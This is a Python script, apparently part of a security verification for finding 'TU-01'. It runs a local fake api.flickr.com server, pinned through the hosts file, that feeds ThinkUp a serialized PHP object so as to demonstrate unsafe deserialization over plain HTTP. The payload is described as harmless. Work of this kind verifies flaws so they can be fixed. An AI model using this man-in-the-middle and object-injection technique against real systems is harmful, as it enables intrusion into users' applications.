"""
Simulated on-path attacker (MITM) server for TU-01 verification.
api.flickr.com is pinned to 127.0.0.1 via the Windows hosts file, so ThinkUp's
plain-HTTP request to http://api.flickr.com/services/rest/ lands here and the
attacker controls every response byte.
Harmless payload: a serialized PostIterator object whose destructor only calls
stmt->closeCursor() on a stdClass -> observable PHP fatal error, no side effects.
"""
import http.server
import socketserver
import sys
import os

PAYLOAD = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'payload.bin'), 'rb').read()


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        sys.stderr.write("MITM-SERVER: served %d attacker bytes to %s for GET %s\n"
                         % (len(PAYLOAD), self.client_address[0], self.path))
        sys.stderr.flush()
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Length', str(len(PAYLOAD)))
        self.end_headers()
        self.wfile.write(PAYLOAD)

    def log_message(self, fmt, *args):
        pass  # quiet; we print our own trace lines


if __name__ == '__main__':
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(('127.0.0.1', 80), Handler) as httpd:
        print('MITM simulation server listening on 127.0.0.1:80 (api.flickr.com via hosts pin)')
        sys.stdout.flush()
        httpd.serve_forever()
